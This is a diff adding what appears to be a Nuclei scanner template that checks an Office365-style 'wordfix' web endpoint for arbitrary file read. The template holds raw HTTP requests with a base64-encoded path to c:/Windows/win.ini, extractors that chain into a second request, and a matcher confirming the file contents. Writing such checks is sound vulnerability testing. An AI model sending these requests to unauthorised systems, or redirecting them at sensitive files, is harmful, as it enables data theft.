@@ -1,0 +1,48 @@
+id: office365_fileread-wordfix_Index
+
+info:
+  name: office365_fileread-wordfix_Index
+  author: msk
+  severity: high
+
+http:
+  - raw:
+      - |+
+        GET /wordfix/Index?f=YzovV2luZG93cy93aW4uaW5p HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+      - |+
+        GET /WordFix/GetNext/?f={{fname}}&img={{imagename}}&isIE8=false HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+
+    extractors:
+      - type: xpath
+        part: body
+        xpath:
+          - '//input[@id="Url"]/@value'
+        name: fname
+        internal: true
+
+      - type: xpath
+        part: body
+        xpath:
+          - '//input[@id="Img"]/@value'
+        name: imagename
+        internal: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains_all(body_2, '[Mail]','[fonts]','[extensions]') && status_code==200"
